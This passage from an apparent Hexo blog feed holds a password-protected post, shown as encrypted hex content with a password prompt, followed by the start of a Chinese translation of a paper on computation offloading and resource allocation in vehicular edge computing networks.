eb4b17f9385af0291773afa99cb2ff45ee1649045dec436113f394c2ad9336416a64f57f34371bdd71043415b65072ab187a41e55020d856bf80a612ac9913bcdc7d29ecc0b1574715da36c77efa9ef717528c1135ff3a10521e2bf11d5e01a10efd36010d30357d481c9588388ea13ec2348f53ccdc549c52c59b1bb3fcf696d9909a081808fc797ae3e5bbee58c251fd1e298490adefe7136acb482c3252f0e1249161d19a373c55fdafc416d126af070f88f527f452e7abfa13f4bcf3b90cb3f92213a8e74daccf1198ee473c56e627917e0950b23f098303ea69fad80a39487792efa9f5767e5b4741d65d61eefc969568b4db35db7bb21eca08d3d7dc2f8fcb3061bc89087dd60793362962b8ac5a32ae533ceefcc3f7e1c7da97bce3d6c247e944b6debb2cb6103fc6ccfc1011a8e09b2169d9ec821a6a1a98aa323e613f410dae2317bc843f680d6da71f57e463a881b5a15307cffcb8d4a39292822d7340fe3697a9bb3d48666eebdfc3bda20e4d6cced5f85604981a72fb301aa584deecc94657186ef3d5e6b99a061e09113956d1af4d6b4c692afd0f911ff6c8efb55789fdfced30b4285274e29b8387ea4bd29725bcc490de3544e88705af8f412e6532519c5d36f6abf218dbea9673ced4aa0686e8762e2d7515a6d3ca4f856b4d9e62a824e222282b5a063993c0abf42743dc4b6c9cbfa1a7743298459035590c70cec66e076d5b84ddabeec8ca42bc9087db0b6d3b60a7ea930de16099f672797c7258e2ba319661986a45e76a6e7d300d6a06bc73f93f2fafb1d50521852fa8d9ed347f4a899563cd99e403d7361ae9e0f73e36417a4d68dc85fed1c3e8fe730b3916e487e524cac80802b957b86a371d912b75e6e2946def5887b6e7e420cf341c54d811c77fb62660234bf532150bdcf2484930ffba3ee44d3a5ea77028f1ca5c238d7d2bdecae121058bed7da2269bed701af85a6c0879a70d6f2cdd87f54549f63e0f8814704ae108f1ed4ba9445819025e624bd3a55389dbf7c03bd6fa0c437752b1e6a98618a0dd426e13c1c8fd4bdd8e97b4375a272e7ff53296d470a5c4f3afaf73457fe3d8258c6428b4b99c25df29c6f39656d6cca36a2e6ebfaaacb2bdae91872aa29e05bdb1f7b5196d772cfd122c17cc08b8d4b2c84e5d7cd63422db81ca0e3d087e850e32512c6a4a9d4c102757c0f225a2e6e08346f0a76440fe209ac69ec2607ba38c3f0a52c1d6f4a41f414201693a59a22940484af34041382768e5b9b307b8ae931580996e5f2cd23f89b52926012b89b90f80a3da1eceb2ef055fb84f8d58e7d8c067eab4fb05340b8150e6ee50aa24a3cdd0eb2872d59fe950ba0066e155b0417660d703317e01b0d392b4e236b3a8ba98aa23555a0a8ca27218c55fa21eec79a74ab25ec17c053b6d35bb2fea6ef54637c8060eaae7ad0a9548aacc03fcee91ebd6e4ecd64ba4ca562aa6d76b0ea45d0b91d5c3e1b3c7ed8d619a95c940835cd82cb6d9689b43abc8c81a58a7f409b0a8ffe7ecd49ff8e6e2dfac2e6ffbfae1882666dc0940cd729f26c79de3eb65535facce1a85214dc2d9588bed0c574b8fb8ffeb4f9b504c12b6af4ec0f1a2e1f1118b08a833bd04882ee4474933c93b38146cb09183d1150364091fc2638fc2de0971185cb274b4f7ebf71cb3f037ee59b878b25eff43599d3937a94e19be782867f62292753ec4f5a6539fb4e3b65ac3496939e117c9a593f713071f2724f3acca698d2f4a674b3772a3fb1265bea122f144df8a671a8e788008b2cda0a3d491aaf04ab858c6ca65c8216183a2c7eac0fd125b002eec0d5ced3e7e5a3bb49acf00b1e3857128315dac1a84a7bc9b3913aff7e13caed72cc2d1433d299e79d83d688864cf27c6ddaad4d731b14194c2d9da1a2f196c61194f63905a5243403d82184f2752ad49ea73f6c9d88a7d29be4253b774af2e8493e29302468254ca9688e435320f3752d3cd9957cdcd262298b25bd9a8d652904ba8e57743101a001b65668b7ef1d95fa279961ce57cf7a728a7683a8a2d6f6af63f57bb92bc70f308437157e465568c4fa8d021930f8de489538b3fb10f9c648ffefabdaeb02931f0d08a4e5b8b63d87a8a11a52258bd7f5d84c4a690924249320fcf43dfdd6d27a0d11774fb941f08f9ec05d28e1eaabc1001154aba8a7874a1c4e94098aa0aac9f1023c24a5f8080e7dcdaec3de387f825a710968fee6afa08af92b22f8a3d99271cc4afe99ed6400d8369869890a60ce6aaf435c2c9fc7047b876f3d2e1651ab79a666ffde6c3d091abad77800d125899cbfa5b6c365accf5d6ad077c2bb6d5a12dc4a53a98ad8b45a42472cc5f99d14af08ccc8cfa8dd3e7552cf4127cc0c57d5888d459781f45a5b5ca80059531d8481cb0bef3d0f90a0517fcfe2b9402a75382905c12786ddf3b42c5b6c60db937bc8c296b3dc5cc9216a2d1c61a340af4a3ff58b24007ec4bd009b8e4bfc1d5017a516b7cec6a67193cf5357b911be8ed2769bce5c5a48c206d284c282019a585b689f038130eb2723210a9a871e812e1746b077efe322732e64b0ee1b5cf1d2233f98a270517f24c5ea5752da584747218f56e5adbb0d0734f1c33ef0e70dac4dd84cbbcdf95f86c574b863e6aa7ab0b6cf935dbf78e26a1da3d39ffc09c46eebf1f3c2de1ccb921ce3d4c4cefb4955e7c47d07918417183f3133fdb136684391e5e5bb5d87530af61d3f4143d30f0d717dda57d4afac023e64c80ae9f8114e3c702e2ad9a30288d41671e3bcbcf9d2dbd6afeaa0a64b49e34436be7d2e918681f01b44dff505b88a26cddcae222825e1274d4f87b79ba5043947d5bc163915c539566d36145d2aad57521f19fea2de986807a91adea1da8f55e785f5b71d25026427b5cfbbf7f08f59041142fdee5ba084043633bcf4f7440b0a6083cd33edd3e1cfab49885291738d2377638d2574d80a4465c7c0ff3dc1a184f782b58d97f99bf0e8c771f6986ded91791b02d666b98ffc862cd6881ad319eb662eae1afdf327b762f16d34d846995f5da66bdffb18aca7a0b03e83f9ae9758f8ef746dea19be3e4a73d9f07231558391c701ec285f734ec2d7215c53b073c25abddd9333a332ae3202726945346daed178573958ce224fa53f8d1de5c61ed5fb9a9be9b2eaa3655fee16e95389647263bc33ef7c3424b90c29e3200483e808a70771940abf0861bd202f8f652b8acbec185d3d0a1b4aa5605defacd985baa9925bd13edaa069ae9d2333a7b250274f5b2f1776732dd1621ddf16cf0fc2839cd0bb82c980c97e933ba3826865c9c9597aa3ea2d2c5f9347525cecb44e7a245dfc8c47ec55f88dff5886b190de8ba32b3e5db52608e9ebcf65ef377113bbd71ba8309ebcaa548875d8f74e17fbd20d3da6926f92b601615ce67c811d69208f89d3e7f2c3b73e5ab680b33170c54585d09f3ad27a2355d7304051469e6c5e77940a071a4c0c0b2312f53ab1e008ba3fbc574d8c22f53f099816b97f1cb751bdab136629cd6ca38fd0a70d135f4609f68f4beec3b13c4ac5d5d118fb749b0cadd6e112e34aa2021a2b5b079a7454fe5101570b4d0d2ae588308e7bcd819d1ce45e2260488ca2e45cd3bc4e50eedf41c499ae3b8ec5e034e45e9a26f28da49537cbb9f3670b0cb6f3e9baa1f96c891c1292b80a1236824e607dcc5075f310ee63ad31336bd54434b5aae571ab5ac78a854485ec64ceb6d4be5b6441eba0b9e6f99e1913583acfa4ea77ec8f4bde002f98cdadf234563289f66ece2df3e7f1a79ec683b10b28bdfe0f4d8e8b5ce7ce5802539f9f81811322e778b0725786d028630a36f4afcd01f9b27725857aac9b7ec5f64a71fbf0f045e619fef5eb5fc2f0a6624d87ad3adb6bb3e70033cb17d3b144d96d18125e78d80dddfcb9bb170dd30380bf71b49c5f8eed49235224daf6edd2bd30ece3905ee8de93ddfa316dfa1c35d7cdba84754921d347519a48c71bfd67effb579abb8bc52537f62b6965310240e01f31d8e182012bb18787d9b1217de65165bd56b333b90e63b324c83589718567415c7928dc38317061497f09a2d4f35186fdb0d08258e0ae31bd9c926bbbb4dffb2848434a0a96c1ac3d640f3d90b3c260071c41f5803de13b14a2b521fdf875704c28fadd0a1cae14fcda3179a8dde2da1323da87323961015b78e9b9c73a89b86eed984128467c4f0893cc9d95a43c439913b226907fa8400e9e0ecd4150ab0c408b510b0dfadc91ba3d07b9885ed2388e828586fe221063f9136600891a061df39be29a598547caac7528fd81b545119c6395c1ea2af66e5652cd2240a00764dbcacf8586cd67d469d8865340062fc5c39301da1860614e3c57275bdcc33cb092f5c806abbd54f3c83474cf9bcaba539ed052f8d24836811c3596e23848494afee51837e7559cacba1926b3352010051234ab4c424b6d049fa26bc4985eb293241b50f79cf0db976159e424b3393441479e54d3f45a43b4da372148c9fe88852ce0f0766c13ab134e815fde394e5ddef4962655016e9edcc5247155e470eaf8fdf2a7bc895cac9a1d4bfc715a61f56fe5434adf369c7377c7b55edb8d5ea7c87a2d8fdccdbb84a8806ff96bb52c10c9963292e023b75cf1521629868d0ca812d306223a6bb79afc1f7b437a4cdd8b2d705d00d1adde3dd6c9eb3279e81fdcd8a51c108fe5895249294089c23a070c77400167467de6f3f7f39f77863e79d6b244885f9891db8d1329a9ccd09e4b5036583efb784e5edc481987fa9c3d552f01de6ae58c173af6fa543b73cc434541d1d5dfcdd4c72ee125ac0c029a10febed253b16b8a8dd4a410178b3ab8f1cf897bcebb2240cc3dd244ef785efe91a6257fe9a41ec55d7da1c4874bc82cfc701375a3958ecfbaf8013103a264062db89035df7bde760520cb662113ea0b36fbf6398f02dd2e9dafd0c7089e8208142f55ac760cc91f0c9df0c970440d3c443a03c7bd481341b4a54f3f5f7029b5bb2b8330e4a1de0e5eca96818d512fc6221ca8e374aec37ef26aa118f8020404104127bfb945749e5dfa26db26e15c3118cf8b484115046d60902cd00eb26dbde20381c0860a2db48d4f8235a79d484bfa82971e89801db22fb0614bbdbf8f3e3cce7e00b307c3a7c6473137473e130b7df3d0fee7f82bd1f43f5eb38a225d2a0bdcfa2a6101fed7f4352e10cd8503dc5e327747f500a92eb79cd4644156bb47db9911afc0fa7bee560a1a98e809a05243368a7d7a85f69fd94125fb6ea737e76299bd9dabd29d5b6d785b0a9e72a8c1affc70fe1afb77d05e28d91c127f756920dc0728402abf0aa45866aadde382b87f816ce834fdf0cc26193bf9f6d17b92fd17a6f973d06b080d7b8353d892c250de94bc76bcef7bd90743929f3251a5708b6e99c993bff436d516258a1793f85cbee7e10538ab4676a406fa2eb56baecb2cddb3f39e6f68f3e089b11a8f44c6015de8e18cf843408896379268dc76b2423d101d16284a161c4b0e9a9d489f509dbe22ce935c37e8fe1a52fbd10994ae1d3d5c83555667b6aaf62e3bea94178656f92481f85b6476b89e2073cb7764d75a84295a49bdb9be48195d54e0372ea6c7ba10dc500da90664f711f086c2211903db52f006e7640eb7846f17392306f3dbba5a0514ea4a4e1adfb2da37fa75a69f991f86736c7f4630532f42c9d9790fcd552bc54ca91727185ea601fc502af5df4601e684d2399794e3dce9a019b37c16a6f907fe2ca2cf1678a6fea48bb354c581d12c8b45234d041adeb39340ec328ae6dac2b054a2651c7fa782a5748d41d5c3f1667df787668423ad0f4f1f8a1ce9bfdf1f047510311506e04a5b7e76d0ffdde29f245d7d7f93477ad99f2ea61c27a0606bbabadfc131ab9feb35feb6f9d564c1c08a062775b16ce50d312e9f2bafd3b99e599d143fa361247f92e7e557a4fed2b6e7a14707b2996fe6d0e711a38f05e30101939e9b5fbaa405be57e5d1c529938ceece807a524eaa0e1dd74a94600f0dcc157a64f268132337e75425f61b4f4dd0d9f3c9c58add3dbf9e2395931f142a063f12da08298b686d9ce113122b81f7e26d8e55e68042fe67abca3955de5b58758f7ad1d9ced2abac359b939a0048bd4ce420fabf8d22011a2dad8242085730c53ea0ec8578211ae3b75556b7947ec6e2c8cd5cdfc96b6e48184d35c769feb3005684101b90389045f7acae6af72dcb2488c6505353b25d54c4527b76f003d4665745808234726c8cdb30321d981d405ee42e7579c947b38e7c771323d3a4fc0be61cbc5d5e3f2343fea776231c1a1496a40869406ef8b785bb911a1ab8106f323d272895544a152753a2b55b24a7b591e17e14892a55d962f3aa7bdc7e4fc891981dfda6744e7871bc1758e96afe4746d31d5b015aa176dbefdc1471f35ca89606085e0cc124f08183cc7c51929b85148d3925b0e9fcc073a5c9b05c2a2fcc997dc2c15939a6e57da00c79400d5b00c0623aa451edcb89e89de0b7aa28cd72a24ffc83791a4593923e2d6076604cc92241197c1c6b242fc3dcce2c9831f454f7bb383241d212d3a2dac69330073218329648e50275a062bc880c5025c22a6236faa2e0a298eaece15c8a080947dae3b32072a42a36ef8d7d7ef6f422085a5d4d79669f0a6481f1694c5fe893da34ebea8b0b2f4f2957019a153ded1e95ccc519a0c8cae12ce3715f5356f270d1e73f98c877985ac9b8adba16f274b6f49b70b13ddf1efcb02d59fd7f0cd33ccdfcd17dc1b1de6a149358be2882a7f04c9c269501073b18c00b615dadbc66375744c6a637db36d2a50045475260b6a61788e8e4d13d0316dcb2efe4d35fe38c52822de5cf23fae722cd09c669022fd6691901827d4bc7cf4874827cfee054618e67a8e360bbf31019ddaf4542b9b18a537d5fb64e7b0257b89aeb47680643e39d06c9965ce4aaa4b9a81ca8593fbac3ebb46d0bcae99b10b71464393c9961a0067fe249cc5b184d225afb15c285160aa20fce29ddc099ff200ac0fcb9633013bc2ca99097e02f45e0b140226c218c1f9262b35c0ce1d15006193abc5b76f5b6e5da5ffdffe242195380a8c23f6bbf2f527cfd5a02d9532a80d39eb1491c8fa61726901f4cf5effd0100caa2e0296c3e284091f1bec68917ec48f1e27a10a19342e102978e581bd33caadb90a7e3b32725d3b3143b8aa80647939a448c934c222ec9e514d652bcf2970d5981bf6aa5366ad3b9010f1cc16403611b7a08ae72ea24cd935ef3c1020961e2150e07ed2a33ec7037720ef1ea9e6d399184af2dcca16964a80587aa4a407b7e45881fe6d74e421daf9781d41fa64b62a9a6696dd1d8e94c55e3f908d3fe3f65bb678d9ff45cedc3413614b43700d29d525756b6d3c9448669abd398c42dde6a327e3d98b039349dce72e1e31fd3248435e5e6437745a597efba4dd133e99811edb24db003f4f359fa485e294d55ce4e9abd28dfec6440b68ac82c84f9d1e547e62b55a6917249072468e03a6bcacee236f6873b9be8250946247c6c302022ed3d12caa223d4fde8e629c6d9baef25bfad8e3c2116519617b123c93d4b676670735c24c26149629bd6115a0d33d7f5a93b4ae9fdb36bd446da1286bd89eab82f788443fea685a04a310d8de4a2fb6669e57d73e3d1674975e32e811c90736d5d35b94977368233518b9d1035e00e88537780766ac70056ee881ef216d2d47df8a001394b5e7589a730de8082506b0a748ee76f38a8f019d95ab6a1c6d1de5d4630b43e7baff2afe32f9a8b084bfa43085432c82622eb085dbd14df70b109d5aca10b43475119d340108ec54463a44fd2218e86454d0af664496aea1f8f9cfe343aebd0c7c1a8b32e5ce5e900cb9335279c28cb8aa7cfb52109b9a704a0d05ba488714ffd281b2e4c6cd3c05f1f6d93cfaa51dc16d1c3034cb66a6a15ba0d1baa91c0500e39fc48f5dc9147b41743c3728a8f81b21e5620e03487f6aab13d6aaf724d6057e136fec2d646b18b497188a3d3af7e1aa1fc1bfdf4f583a79a0f4af2b2cef69ae3d1df529149d9a1953724f5197230ba18efe0603956c79b9d198565becdc26690b2153e6a9c4e3096b7e01941f6a7eab48181f5a86556b62676d8cfbd1c3f958281e0394ea41fef5197ba57ff965eb6db99a355cf2f5d90f7c7972eb275f4478df10542eb3f33570c078aa178103744406198c49dc03b913d5796526ac850598b5da2e1fd47a663a2a82d02369a22c30f97d721ac90ae840a722d82aaa04d1849573a1741c3253434a5cbc59b5348facd8d2e82004d5d53f2977a29a8e55b82b40ebefc1302ae624aa052941b775daf485d8cb073601bcf02d433befe5fdc96578624f57c2652e58289de6cc9a89dda16a8f1c98270736858826149484347a35cfc055c93878e7ced9ff8e81750e12aaba5f1ccc107c28cc70b80cbd62f96a857f8744eb188aab1902b118d29fdde5be81d082bff2b55592d0049c788044e300947c0259f2cfb90775b2b12e1222a2426c62f0b0caea583aa308d9b074fff0cf534466c773745137d294ce3fd9f8ea805e91d05a899b23b55d2f0336018f1a310a4f50f2b3a3740af3fd3c951656f8ce21fb405bc97e47466dd3714319c8259e8b6e6d5346a33e12e29fcca24946b172da7a2480045be09d56d81a7557646c593c7f3e35a5a1caf206a8b19cd990e5a1518cb8eeba29b8ed05c243064d5a03b62e7665127b255cb0d26000b2b0dd5ef36b255b6c6353ddd99b2aea4527ae4945deafe6f4045a7af441a2a17e30e22f3ac420f18ba8897cb8d08482fd05b85961ebc49f9a23f277ea3b6943bb9a9b163ba640c3576de5428e359a9db01226a9ed619bed6978b490b4444dd54029d11fb273c760febcf51bdeb7f1c473784faf22c598d505ee455f8779322286d785384ff5e283c223aefbd54baf0ba628ced2e7cfbbcc5e41117060c063550ab0897362ea524749844784904bb37ead0257aacc12e8bde053c261a3895bc956c6f5ee5d2336ac33ac93e8501a1cc8ffb2763d533ddc9ada313563b78f80f11f5d1b4d1dc8a031ccb841ede2a54b24a9647cf6ee515eec0650d399659b790ae5084f8e9154b8cfbc61194fc908003c472af95fbd41672e5c5a0e5ded441ff2d0b9d69d4fed65de7926521351d05a0b0a53d863cd785c756a23e402e3147ab22b5124a99757f4ca436229bfe6912bbef74b782cb865866d0f7650fe185c4ed7206e20007bc2956dd230bc42a4b960604b575e7cdb37c453d66cf340396f2ffe3df28a73155999c3ed2b0974d5833fc0dd6a344ef827e5df3a5b6d2100059c5e5dbdff6282ed4e4736fb8ddf890ecfca6e30e9ca742fbaef26c98cd9abe84a21dec80c5305fcb4538833dac7038ce11cf2c0919f477b37268f2dee0f549cc3901edfcc611b4d058a9c5d97fdc92722ae96d6bec9fa35f4e978db89fc9d0457ad3f7d2cbb97fc72c8338373953a9a3393d6094b90438732ebb166f64de1f51e7cfcb847b9dfcf6531db8282c4848387738963fa8f5495faf2f462f956edabf30f2405ba91d8764e62b2438ad246ea3796a8e574f8dcf7608922a74b89d4f264e78b3fbf4bb1609e8f8bbee56c38718d4b83a4370eaca28271093ef92da1fdaa83be89d4e23a0ac1ef7d4c6cd69bd6c1b0833fd23c3c4b5ff9fd68690fc0fc9c7d141248b44060e32cb4476aa2bcce9d8d967726188df3ad422980cafaa2e85affc8fafb5cbfefdcee077a65e5bae560cbd8b69c79294a4d4a0593d7770487180ce6afb332fc31feeda789d983ba20c89e92db161ccca6f88a32cf09904d8c11508eb5d9a5348d5135d5ef8f692b0d02d9f57d6ee11f85316606649814161d22c3e85b4e710d91c320ba946fccb3c77c9b3a4336bfb297e426b4e072b0b7eef28d1bc754d9e3e9da59ff0d0d1a7368c11b661cbec96167ab629a36f28c43978565acb4c99b5ce25a1429247edb4cb3fe116d0719da204570d397f4024ec32ed55d26f0e0c9cb345649a6870c84addc9469da35b1a385533f85896fcb0cc7d89dc166cd18e814ae040f155274d3301a622902365498bf28373aba0c502f79527a8ed4410858022ee75a5b34e9e1c3fbfb4286d774a70bb17b6730b1e9cbaa2c805f6bb26b519f2f95debf17cc400ba22941b218b23fc905a606c424e3ddf020eec30271f18c725d6f3473320d233eb7a8a743ef98b173600beb71f51b57830f6aa590be8284914ff4e9ba0aa6187266afa72115d43f83c1de405f0fc0b910fb13d259049b599273d3db0d0c5436698e0274f6be1dec93a045b604e55cf99140f6bc79817d0098565ca4a58a7728132e43fdbc5b330e99f2844c49c555443ad74ae5bab7024078d3e5eb86a752ba99a953dae8dda58175ca1852dd966b4999875456a607905db75b8b9648ecce11cb4941fb28f61cb3976cb54a0522410fe77cad729aa5ba8cc8acf39f887a2a72071b24440283ae39c2e29bcaaa985f21d2a8aea37ea0f08e4e973a8d1823a9046c4725f43fb414872933b7e73f9f56ff9a5630d549889dae181dfa8b2600910995d3e6b3f587ac1f1ef97dc4151b79f65dd288be31f809079961497990199d01f8ab552cf367c607044b4252bc861ea23065368293840a175c68a466ee9657b2c5c7e64b33aafa2e7a99565ea1c8ddfa992b6ddc234ac794949f1348a13ea03e63512e5740b9bb086c1f3ee8cc8f3f2e5d491bbe92b6b70137bfd48404a31ec20e839852940350f06737dc9160580582e245a1d74110b0db93d49aed302b0e4d57fb0ba18f324d5def4c067b68b15e88e6439827d2eb03c03601083878b276b3eff2273592eab29373af69b4c41e3b8ea14f8f05186fb02be009c8200d0b108580d7fd56c1db82ba779f6aa109397f330bba21e7770018f1df384b8b181f219b075d2d3ab57fdcbdf20bd838ec0b25287c288aaadf0198273f9ef576c1b31607e62be471a1fad41b9cb1a2074cb68d1f62a9a3e2df399d0c2298c8395add49434e5fbdc8f5ab50392d742f83ddd5d051f163b106ca19c3dac19a5514c2d83c0d85c764dafc0d0cd665477359dfa9d906fe1de45ed93a3fd96780f20f7073cf1fa32903b652ead0f656fc6d1328745cf4e7f982d246756da73f0dc05abf6c164dccca6ee4f204b2059030b7b2d8ba32e129a644044e4e93fc66e759a66d4599d3627ec5645074621c58f0f6faa03a8f86f04d1c1c48e3656dcf2d44768c1ef30f3309f83e900e5daa7d601ce9664a85f3e1b0ab51eda7671310242da38fbc7cc50a9a7a5ae217d0c32f2a1be7777a14a4fd8bdef587a93ce6b177fec6dadafce4dd4ca81171c7c5ea4b79af9e31ea4405cef3e8f521cdb2b8b323ff1b0113c55de399cd4490e057021c503eafd2fcc4075995dcafa03306087773cca352421eb2546fe7e0e887531607c6d116b5ffa555dc2a9a88298ce415a535e563d7e239f5060b20988bf7b91d76afad77bdc475907f33992f4f60a6dff2b7c8dfcb748c03501eef2565ce50ff019c74f367506c7b222114cd302aa5c02b97d00cbea8d4a77db2cf3408050322beb6eba1894732c3a28f316073d6489c819f5df95c02d93aa2dc38422b1a036e8c215bdc27372886ae5dee87743f7f732eb506eaa4a1b6ced08a359f4531ef8384ec85b3ccbb7846a5dc8e8041eb0766f5a6f9f00f48b5e39db6e35a08029eb68267ac0dd32bf3525ab0e7d27def825fe0dfc6ff1630b0980b9ff3337319c05ff665a9af9f9390e2124fef04ca8b3abdb3b0a85356aa2b5c1a2378a7077e1d68b1e636d08d0bdebad78b40791532e84d5ead2ea73738fd8f7ce3c668c8ce0c48c72b14ea8456155c53ad56cba158a536dc8be7cf3740288fae966ecbdd3ec2b0035b23df51f0f155d3ca3bdf9bb471e180b80b7d0d2284a3fc0fa74431e16e38173e24f67b12cd767295d505d22e365692556fb17803a43b4fb1232fe4afd2712c01df5ced316b64d5e4a177454556fe55df8fd325d36ac286c1629a706287f458c7b5006cd247d36198a2d8c11afdeda244f7b0b5ae163dbe5ed70f8b7249b6d460feefef7fd46231ae9ec9d2f164220a3fff61085e86602871e43cacdc8ec919412c923abbe88f68b99204b3c4ac406907c7b5177d10f19fdaaf8e7d9ebbb7f5a836b4d8c31cf71e903bfd92bd23852b4230d575953b1b924a2fbfa2d00da9fac4671cfda5239e08d80005d89b3357a8fb20e8dd331770bff637cb70bc8ffb2af45983659a6ecdd9673e8d43eee04958c6f697c0258faa00006c8a65eb386f6fe89f619b146ccfc39e3a29c02b52f1036e875587daeefedeac843244b97d97bedfcd9b2ba2823c2ca53487af9ef5a1623fc4c442500f832b82d3ac0ef3c881f5f92224bcb8be448a7a30937d5ae8052b26268647552103aeb6fdbe43276dbc7b3e1c32e1f9bcbb6c5c9dcfe5d1befcf5cac44d671dd2993899012163225201e15e9c5b4a3035a43de2729766d87d738d8a2f1b7526b0e5e30c6915f92e2e357b995a4cc4bc6579559c79af49822b7bea66b80ef6fdf92b043c1548118ff404ab0e82c113a5b489aee5375172dac05bf2e6d3ec9e3434b8399fd5885ca5f07f0b0ba0fae44b883762067433db38f1506a1d8910ec00936668f9c0ae806ae4cbb75cf3c54ceb744d63ed31f5c224f58274da74360e48f881264c90d5fa3e14838418eb850577828bba0a7dad4fe0cfece3bb8a769dbefaddfb08c7e4b8197aa60105310f5710d8b05ba9cdcb6dadd3a9fc1133e4aa35dd2118c043d89f24bff673fd02fc4967ace21176047240b952d5b8bde2be06fe143e5adfabbed8865e928d30f9ea7fb48149d24d55553b2aa2b3ee93b6d2bc34d2f855c08d04eba7df1f391ac8cb626a1d7a8a8e45dd9b39a7f2c9cbc324b6bdb43292738ad02fdc764e0670a1567a776b6e83af03350310878977f843c2d6c22ee32eb0dfb8faae3d12a7a9a185450e6dbfcbbb3657a4cef21fcccb69f96bbaf17726bfd4bfd953891273764153ae7b4446e6a355112946d712cab5b52dbfe577c6199a3feff43dd5d6d2a92589c85fc88dac3e0ff3336c4ce74f3aa75701358632028ee44949ba1caff009c2513f813709aae0eadb021934a2b653e4da0c9914edd40da1a64fdf133cd5008f086d05ec06b3750411d94724e41c0eee100f5f5c0a4e6e652afb27913338c9f00b7906368bd66004ff7ec82760f912e42a2f1720367d74bff8c8aa4a44e2590a119b62543441edba5be7ec9afb5adf463109d95b025fa25f28ca0a1211035ec4621d05095a2cf9116a2a506a8a543cd0f617c2c38453606647af7ff4d70bd2b0fdd9296f7181239af733ad2af4f18ec1ed55d73e7084f89df3c99035032b872430a06c25d1fec84a0a0a706fb48b0bff137a692108de629b744045be442e7407e390940557c4fd62afaac57a865a09cf4f7fdee23ddd96ce77c266a9c65ccaeeba8d530abfa579720c6afcd34f1d506c3fb60c6cefa66b7a96ef587847385964dec5108bebccc773299321ab90f4c938c2902ebcb8fcfd</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Who am I?(拼音小写哦)</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <categories>
      
      <category>复试</category>
      
    </categories>
    
    
    <tags>
      
      <tag>复试</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Joint computation offloading and resource allocation in vehicular edge computing networks</title>
    <link href="/2024/02/28/%E7%BF%BB%E8%AF%91/"/>
    <url>/2024/02/28/%E7%BF%BB%E8%AF%91/</url>
    
    <content type="html"><![CDATA[<h2 id="车辆边缘计算网络中的联合计算卸载和资源分配">车辆边缘计算网络中的联合计算卸载和资源分配</h2><p>Joint computation offloading and resource allocation in vehicular edge<br>computing networks</p><p>关键词： 车辆边缘计算 任务卸载 匹配理论 拉格朗日方法 分布式算法</p><h2 id="摘要">摘要</h2><p>​车辆边缘计算（VEC）是一种很有前途的技术，通过将任务卸载到配备边缘计算服务器或邻近车辆的路边单元（RSU）来适应计算密集型和延迟敏感的任务。然而，边缘计算服务器有限的计算资源和车辆的移动性使得卸载策略设计非常具有挑战性。</p><p>​在此背景下，通过考虑车辆移动性带来的潜在传输增益，我们在VEC网络中提出了一种高效的计算卸载和资源分配方案具有两种卸载模式，即车辆到车辆（V2V）和车辆到RSU（ V2R）。我们通过将车辆的卸载延迟、能源消耗和费用与差异化定价策略以及传输增益结合起来，为车辆用户定义了一个新的成本函数。制定优化问题以在延迟和计算能力限制下最小化所有任务车辆的平均成本。<strong>通过将问题解耦为卸载模式选择和资源分配两个子问题，提出了分布式迭代算法。提出了基于匹配理论和基于拉格朗日的算法来分别解决这两个子问题。仿真结果表明，与三种基准方案相比，该算法复杂度较低，系统性能显着提高。</strong></p><h2 id="1-介绍">1.介绍</h2><p>车联网的出现彻底改变了计算时代，让车辆变得更加智能，为自动驾驶、车载虚拟现实、实时交通监控等计算密集型、时延敏感的应用提供更好的服务与控制[1–3]。然而，车辆有限的计算资源已成为满足智能车辆性能需求的主要瓶颈。车载云计算（VCC）是一种通过将计算任务迁移到远程服务器来应对这一挑战的有效技术，但长距离传输引起的延迟波动降低了卸载效率[4]。为此，车辆边缘计算（VEC）成为一种有前途的技术[5-7]，通过将任务卸载到 VEC 服务器来减轻车辆繁重的计算负担。</p><p>任务卸载是 VEC 网络中的一个关键问题。一般来说，车辆生成的计算任务可以卸载到附近配备在路边单元（RSU）中的 VEC 服务器 [8-11]。通常，考虑二元卸载决策问题，其中每个车辆独立地确定是在本地执行任务还是将任务卸载到位于路边的VEC服务器。部分卸载是某些工作中的一种选择，其中输入数据可以动态分为两部分，分别用于本地计算和边缘计算。此外，一些服务车辆可能在一段时间内没有计算任务，因此它们可以通过车对车（V2V）方式出租计算资源来提供计算卸载服务，以换取一些收入[12-15]。 V2V卸载充分利用了部分车辆的闲置计算资源，大大提高了VEC网络的资源利用效率。</p><p>然而，随着车辆用户的服务需求增加，有限的边缘服务器资源可能无法同时满足多辆车的需求。此外，车辆的高速移动使得网络拓扑不断变化，可能严重损害通信链路的质量，给卸载策略设计带来严峻的挑战[16]。因此，制定更灵活的联合卸载策略以提高卸载效率非常重要。</p><p>为了有效利用车辆和网络边缘的计算资源，设计了涉及V2V和车辆到RSU（V2R）通信模式的各种任务卸载方案，以满足服务质量（QoS）要求[17-20]。然而，现有的研究大多考虑单向车道，忽略了车辆移动的方向性。相比之下，考虑双向双车道场景更为实用。当任务车辆与其选择的VEC服务器之间的距离缩短时，可以实现传输增益，因为数据传输速率随着通信距离变短而增加。据我们所知，现有的工作尚未很好地考虑任务卸载过程中的传输增益。在本文中，我们重点研究能量有限的车辆（例如电动汽车或车载用户设备）的卸载策略，特别是电池容量有限的车辆（例如智能手机和可穿戴设备），其密集计算应用程序不需要不仅有严格的延迟约束，而且还需要大量的计算资源。此外，从绿色通信的角度来看，还需要一种低能耗的卸载方案。因此，应该设计一种有效的任务卸载方案，不仅可以减少任务处理延迟，还可以节省完成卸载任务的能耗。然而，任务卸载并不总能保证低能耗和低延迟，因为卸载数据会增加传输能耗和传输延迟。因此，综合考虑能耗和延迟，设计有效的卸载策略以满足任务车辆的服务质量要求非常重要。受上述事实的启发，我们提出了一种混合任务卸载方案，车辆可以通过选择 V2R 或 V2V 卸载模式自动将任务卸载到 RSU 